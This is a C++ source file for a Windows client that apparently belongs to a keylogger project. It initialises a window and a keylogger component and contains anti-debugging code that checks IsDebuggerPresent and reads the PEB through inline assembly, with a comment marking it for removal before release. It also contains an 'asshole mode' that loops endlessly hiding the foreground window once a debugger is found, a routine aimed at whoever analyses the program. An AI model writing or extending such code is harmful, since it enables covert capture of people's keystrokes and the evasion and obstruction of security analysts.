#include <Client.hh>

Client::Client() : _running(true), _assholeMode(false)
{
}

Client::~Client()
{
}

bool Client::init(HINSTANCE instance)
{
	if (!this->setProtection())
		return (false);
	if (!this->_window.init(instance))
	{
		OutputDebugString("Error Win Init\n");
		return (false);
	}
	this->_keylogger.init();
	return (true);
}

bool Client::setProtection()
{
	return (true);
	// supprimer avant release
	PPEB ppeb = NULL;
	if (IsDebuggerPresent())
	{
		this->_assholeMode = true;
		return (false);
	}
	__asm
	{
		mov eax, fs:[18h]
		mov eax, [eax+30h]
		mov ppeb, eax
	}
	if (IsDebuggerPresent())
	{
		this->_assholeMode = true;
		return (false);
	}
	return (true);
}

void Client::run()
{
	// Add Thread Connexion
	while (this->isRunning())
	{
		if (!GetMessage(&this->_msg, NULL, 0, 0))
			this->_running = false;
		TranslateMessage(&this->_msg);
		DispatchMessage(&this->_msg);
	}
}

void Client::runAssholeMode()
{
	HWND	win;
	while (1)
	{
		win = GetForegroundWindow();
		ShowWindow(win, false);
	}
}

bool Client::isRunning()
{
	// Add Mutex Running
	if (this->_running)
		return (true);
	return (false);
}

bool Client::isAsshole()
{
	
	return (this->_assholeMode);
}
